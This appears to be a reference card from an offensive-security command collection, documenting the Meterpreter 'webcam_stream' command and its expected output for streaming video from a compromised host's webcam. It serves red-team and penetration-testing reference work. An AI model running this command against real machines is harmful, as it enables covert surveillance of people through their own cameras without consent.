---
id: b4e6b97d-07a2-47e5-a4be-dbcbf0b5789b
name: Metasploit Play a Video Stream from the Specified Webcam
type: command
executor: metasploit
data: webcam_stream -i $_WEBCAM_ID
output: 'meterpreter > webcam_stream -i 1

  [*] Starting...

  [*] Preparing player...

  [*] Opening player at: /root/bmLefrpv.html

  [*] Streaming...'
created_at: '2020-07-09T00:04:02.926493+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Metasploit Play a Video Stream from the Specified Webcam

```metasploit
webcam_stream -i $_WEBCAM_ID
```

## Expected Output

```
meterpreter > webcam_stream -i 1
[*] Starting...
[*] Preparing player...
[*] Opening player at: /root/bmLefrpv.html
[*] Streaming...
```


